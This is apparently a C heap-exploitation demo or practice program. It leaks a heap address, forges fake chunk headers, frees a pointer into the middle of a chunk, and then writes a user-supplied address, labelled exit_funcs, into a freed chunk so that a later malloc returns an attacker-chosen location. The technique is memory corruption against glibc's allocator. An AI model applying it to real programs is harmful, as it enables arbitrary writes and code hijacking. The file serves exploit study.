#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <stdint.h>
#include <string.h>
#include <dlfcn.h>

uint64_t *chunk0_ptr;

unsigned long read_long()
{
    char buf[1024];
    char *end;
    unsigned long ret;

    if (!fgets(buf, sizeof(buf), stdin))
    {
        puts("error reading stdin");
        exit(1);
    }
    ret = strtol(buf, &end, 16);
    if (end == buf)
    {
        puts("not a number");
        exit(1);
    }
    return ret;
}

typedef struct chunk_t {
    int64_t size;
    int64_t used;
    void *ptr;
} chunk_t;

unsigned int *a;
unsigned int *b;
unsigned int *c;
unsigned int exit_funcs;
unsigned int *d;
int main()
{
    sizeof(chunk_t);
    setbuf(stdout, NULL);
    unsigned int *x;
    x = malloc(100)-0x1010;
    printf("Heap base address: %p\n", x);


    //wrapper
    a = malloc(100); // 0xa04010
    //prepare fake chunk 1
    a[0] = 0x41414141;
    a[6] = 0x101;

    //padding chunk
    malloc(80);

    //endchunk
    b = malloc(100);
    b[0] = 0x42424242;
    //make fakchunk1 size accurate
    b[20] = 0x100;
    
//    malloc(90);
    size_t t = 1;
    sizeof(intptr_t);
    b[14] = 0x441;
    read_long();
    free(&a[8]);
    read_long();
    free(a);
    puts("All free");
    read_long();
    c = malloc(100);
    puts("Enter address: ");
    exit_funcs = read_long();
    c[4]=exit_funcs;
    read_long();
    d = malloc(100);
    
    read_long();
    printf("ptr %s\n", a);
}
